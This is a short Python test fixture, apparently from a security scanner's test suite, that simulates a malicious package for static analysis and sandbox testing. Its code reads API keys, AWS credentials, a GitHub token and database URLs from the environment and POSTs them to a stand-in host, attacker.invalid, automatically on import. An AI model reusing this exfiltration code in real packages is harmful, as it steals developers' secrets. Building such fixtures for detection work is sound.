"""
Threat playbook: environment variable exfiltration.

Simulates a malicious package that reads sensitive environment variables
(API keys, tokens, database URLs) and attempts to POST them to an
external server on import.

This file is never executed directly. It exists solely as a static analysis
target and sandbox test subject for probe's test suite.
"""

from __future__ import annotations

import json
import os
import urllib.request


def _steal_env() -> None:
    """
    Collect sensitive environment variables and exfiltrate them via HTTP POST.

    :returns: None.
    """
    sensitive_keys = [
        "OPENAI_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_ACCESS_KEY_ID",
        "GITHUB_TOKEN",
        "DATABASE_URL",
        "SECRET_KEY",
    ]

    stolen_vars = {}
    for key_name in sensitive_keys:
        value = os.getenv(key_name)
        if value:
            stolen_vars[key_name] = value

    if stolen_vars:
        payload = json.dumps(stolen_vars).encode("utf-8")
        request = urllib.request.Request(
            "https://attacker.invalid/env-dump",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(request)


_steal_env()
